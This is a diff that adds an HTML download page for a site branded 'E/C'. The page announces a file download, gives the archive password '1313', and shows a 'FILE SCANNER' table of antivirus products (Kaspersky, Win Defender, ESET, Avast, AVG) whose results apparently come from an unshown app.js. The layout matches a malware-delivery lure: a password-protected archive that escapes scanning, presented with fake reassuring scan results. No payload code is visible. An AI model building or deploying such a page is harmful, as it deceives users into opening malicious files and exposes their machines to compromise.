@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="favicon.png" />
+    <meta name="viewport" content="width=device-width" />
+    <link href="../_app/immutable/assets/0.183f71f9.css" rel="stylesheet">
+    <link href="../_app/immutable/assets/2.7ba4ca89.css" rel="stylesheet">
+    <link href="../_app/immutable/assets/Toasts.b4a11c2d.css" rel="stylesheet">
+    <title>File is downloading...</title>
+</head>
+
+<body>
+    <div>
+        <div class="fixed top-4 right-4 flex flex-col items-end justify-end gap-2 z-[99999]" id="toasts"> </div>
+        <div class="p-4 max-w-md mx-auto flex flex-col items-center gap-6 py-20">
+            <div class="flex items-center gap-3" data-svelte-h="svelte-3y3fu9"><img src="../_app/immutable/assets/logo.c6b16f11.svg" alt="Logo" class="w-8 h-8 object-contain"> <span class="text-2xl font-semibold">E/C</span></div>
+            <div class="w-full card p-4">
+                <h2 style="text-align: center;">The "<span id="fileName" style="color: lime;"></span>" file is downloading to your computer...</h2>
+                <br>
+                <hr>
+                <br>
+                <h2 style="text-align: center;"><b>Archive password is: <span style="color: rgb(255, 105, 105);">1313</span></b></h2>
+                <br>
+                <hr>
+                <br>
+                <h2 style="text-align: center;">FILE SCANNER:</h2>
+                <table style="border: 1px;">
+                    <tr>
+                        <td>Kaspersky</td>
+                        <td><span id="av1">... 🕐</span></td>
+                    </tr>
+                    <tr>
+                        <td>Win Defender</td>
+                        <td><span id="av2">... 🕐</span></td>
+                    </tr>
+                    <tr>
+                        <td>ESET</td>
+                        <td><span id="av3">... 🕐</span></td>
+                    </tr>
+                    <tr>
+                        <td>Avast</td>
+                        <td><span id="av4">... 🕐</span></td>
+                    </tr>
+                    <tr>
+                        <td>AVG Scanner</td>
+                        <td><span id="av5">... 🕐</span></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+
+</html>
